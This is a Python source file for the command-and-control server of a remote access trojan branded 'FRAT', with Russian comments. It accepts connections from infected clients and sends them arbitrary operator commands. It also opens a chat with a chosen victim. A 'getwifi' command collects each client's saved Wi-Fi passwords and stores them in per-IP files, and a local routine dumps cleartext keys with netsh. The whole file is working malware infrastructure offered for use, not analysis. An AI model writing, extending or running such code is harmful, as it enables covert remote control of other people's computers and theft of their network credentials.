import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
import os
from colorama import Fore, init
import ctypes
import subprocess
import re
import json

# Инициализация colorama (для цветного вывода в консоли)
init()

clients = {}
chat_window = None
chat_text = None
selected_client = None


def logo():
    print(f"{Fore.GREEN}███████╗██████╗░░█████╗░████████╗")
    print(f"{Fore.GREEN}██╔════╝██╔══██╗██╔══██╗╚══██╔══╝")
    print(f"{Fore.GREEN}█████╗░░██████╔╝███████║░░░██║░░░")
    print(f"{Fore.GREEN}██╔══╝░░██╔══██╗██╔══██║░░░██║░░░")
    print(f"{Fore.GREEN}██║░░░░░██║░░██║██║░░██║░░░██║░░░   ")
    print(f"{Fore.GREEN}╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░")
    print(f"{Fore.RESET}")


def get_wifi_passwords():
    """Получает Wi-Fi пароли на сервере (без обязательных прав админа)"""
    try:
        # Пытаемся получить данные через subprocess
        try:
            profiles_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                encoding='cp866',
                shell=True
            ).stdout
        except Exception as e:
            return {"error": f"Ошибка выполнения команды: {str(e)}"}

        # Мультиязычный парсинг
        profiles = []
        for line in profiles_output.split('\n'):
            if "All User Profile" in line or "Все профили пользователей" in line:
                profile = line.split(':')[1].strip()
                if profile:
                    profiles.append(profile)

        if not profiles:
            return {"error": "Нет сохраненных Wi-Fi сетей"}

        wifi_data = {}
        for profile in profiles:
            try:
                # Экранирование имени профиля
                safe_profile = f'"{profile}"' if ' ' in profile else profile
                
                password_output = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', safe_profile, 'key=clear'],
                    capture_output=True,
                    text=True,
                    encoding='cp866',
                    shell=True
                ).stdout

                # Поиск пароля в выводе
                key_line = [l for l in password_output.split('\n') 
                          if "Key Content" in l or "Содержимое ключа" in l]
                password = key_line[0].split(':')[1].strip() if key_line else "Пароль не сохранен"
                wifi_data[profile] = password
            except Exception as e:
                wifi_data[profile] = f"Ошибка: {str(e)}"
                continue

        return wifi_data if wifi_data else {"error": "Не удалось извлечь пароли"}

    except Exception as e:
        return {"error": f"Системная ошибка: {str(e)}"}


def save_wifi_to_file(wifi_data, filename="wifi_passwords.txt"):
    """Сохраняет Wi-Fi пароли в файл."""
    try:
        with open(filename, "w", encoding="utf-8") as f:
            if isinstance(wifi_data, dict):
                for wifi, password in wifi_data.items():
                    f.write(f"{wifi}: {password}\n")
            elif isinstance(wifi_data, str):
                f.write(wifi_data)
        print(f"{Fore.GREEN}[+] Wi-Fi passwords saved to {filename}{Fore.RESET}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error saving to file: {str(e)}{Fore.RESET}")
        return False


def handle_client(client_socket, addr):
    global clients
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"FRAT | CONNECTED CLIENTS: {len(clients)}")

    def receive_messages():
        while True:
            try:
                response = client_socket.recv(4096).decode()
                if not response:
                    break

                # Если клиент прислал Wi-Fi данные (в JSON)
                if response.startswith("{") and response.endswith("}"):
                    try:
                        wifi_data = json.loads(response)
                        print(f"\n{Fore.GREEN}[+] Received Wi-Fi data from {addr[0]}:{Fore.RESET}")
                        for wifi, password in wifi_data.items():
                            print(f"{Fore.CYAN}{wifi}: {Fore.YELLOW}{password}{Fore.RESET}")
                        
                        # Сохраняем в файл
                        save_wifi_to_file(wifi_data, f"wifi_{addr[0]}.txt")
                    except json.JSONDecodeError:
                        pass
                elif chat_window and chat_text and selected_client == addr:
                    chat_text.insert(tk.END, f"[Client {addr[0]}]: {response}\n")
                    chat_text.see(tk.END)
            except (ConnectionResetError, BrokenPipeError):
                break

        print(f"\n{Fore.RED}[!] Client {addr[0]} disconnected.{Fore.RESET}")
        client_socket.close()
        if addr in clients:
            del clients[addr]

    threading.Thread(target=receive_messages, daemon=True).start()


def accept_clients(server):
    while True:
        try:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
        except OSError:
            break


def start_server(host="0.0.0.0", port=5555):
    global chat_window, chat_text, selected_client, clients
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    accept_thread = threading.Thread(target=accept_clients, args=(server,), daemon=True)
    accept_thread.start()

    os.system("cls")
    logo()
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue

        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        print("\n[Commands]")
        print("1. Select client (enter number)")
        print("2. Open chat (type 'chat')")
        print("3. Get local WiFi passwords (type 'wifi')")
        print("4. Get client's WiFi passwords (type 'getwifi')")
        
        choice = input("\nEnter command: ").strip().lower()
        
        if choice == 'chat':
            if not clients:
                print("No clients connected.")
                continue
                
            print("\n[Connected Clients]")
            for idx, addr in enumerate(clients.keys(), start=1):
                print(f"{idx}. {addr[0]}:{addr[1]}")
                
            try:
                client_choice = int(input("\nSelect client for chat: ")) - 1
                if 0 <= client_choice < len(clients):
                    selected_client = list(clients.keys())[client_choice]
                    
                    if chat_window:
                        try:
                            chat_window.destroy()
                        except:
                            pass
                    
                    chat_window = tk.Tk()
                    chat_window.title(f"Chat with {selected_client[0]}")
                    chat_window.geometry("500x400")
                    
                    chat_text = scrolledtext.ScrolledText(chat_window, wrap=tk.WORD, width=60, height=20)
                    chat_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
                    
                    input_frame = tk.Frame(chat_window)
                    input_frame.pack(padx=10, pady=5, fill=tk.X)
                    
                    entry = tk.Entry(input_frame, width=50)
                    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
                    
                    def send_message():
                        message = entry.get()
                        if message:
                            chat_text.insert(tk.END, f"[Server]: {message}\n")
                            chat_text.see(tk.END)
                            try:
                                clients[selected_client].send(message.encode())
                            except Exception as e:
                                chat_text.insert(tk.END, f"Error sending message: {str(e)}\n")
                            entry.delete(0, tk.END)
                    
                    send_btn = tk.Button(input_frame, text="Send", command=send_message)
                    send_btn.pack(side=tk.RIGHT, padx=5)
                    entry.bind("<Return>", lambda e: send_message())
                    
                    try:
                        clients[selected_client].send("chat".encode())
                    except Exception as e:
                        chat_text.insert(tk.END, f"Error starting chat: {str(e)}\n")
                    
                    def on_closing():
                        global chat_window, chat_text, selected_client
                        try:
                            clients[selected_client].send("chat_end".encode())
                        except:
                            pass
                        chat_window.destroy()
                        chat_window = None
                        chat_text = None
                        selected_client = None
                    
                    chat_window.protocol("WM_DELETE_WINDOW", on_closing)
                    
                    chat_window.update_idletasks()
                    width = chat_window.winfo_width()
                    height = chat_window.winfo_height()
                    x = (chat_window.winfo_screenwidth() // 2) - (width // 2)
                    y = (chat_window.winfo_screenheight() // 2) - (height // 2)
                    chat_window.geometry(f'+{x}+{y}')
                    
                    entry.focus_set()
                    
                    chat_window.mainloop()
                else:
                    print("Invalid client selection")
            except ValueError:
                print("Please enter a valid number")
        
        elif choice == 'wifi':
            wifi_passwords = get_wifi_passwords()
            if "error" in wifi_passwords:
                print(f"\n{Fore.RED}[!] Error: {wifi_passwords['error']}{Fore.RESET}")
            else:
                print(f"\n{Fore.GREEN}[+] Local WiFi passwords:{Fore.RESET}")
                for wifi, password in wifi_passwords.items():
                    print(f"{Fore.CYAN}{wifi}: {Fore.YELLOW}{password}{Fore.RESET}")
                save_wifi_to_file(wifi_passwords)
        
        elif choice == 'getwifi':
            if not clients:
                print(f"{Fore.RED}[!] No clients connected.{Fore.RESET}")
                continue
            
            print("\n[Connected Clients]")
            for idx, addr in enumerate(clients.keys(), start=1):
                print(f"{idx}. {addr[0]}:{addr[1]}")
            
            try:
                client_choice = int(input("\nSelect client to get WiFi passwords: ")) - 1
                if 0 <= client_choice < len(clients):
                    target = list(clients.keys())[client_choice]
                    try:
                        clients[target].send("getwifi".encode())
                        print(f"{Fore.GREEN}[+] Request sent to {target[0]}. Waiting for response...{Fore.RESET}")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error sending command: {str(e)}{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[!] Invalid client number.{Fore.RESET}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a valid number.{Fore.RESET}")
        
        elif choice.isdigit():
            client_idx = int(choice) - 1
            if 0 <= client_idx < len(clients):
                target = list(clients.keys())[client_idx]
                cmd = input(f"Enter command for {target[0]}: ")
                try:
                    clients[target].send(cmd.encode())
                except Exception as e:
                    print(f"{Fore.RED}[!] Error sending command: {str(e)}{Fore.RESET}")
            else:
                print(f"{Fore.RED}[!] Invalid client number.{Fore.RESET}")
        else:
            print(f"{Fore.RED}[!] Invalid command.{Fore.RESET}")


if __name__ == "__main__":
    start_server()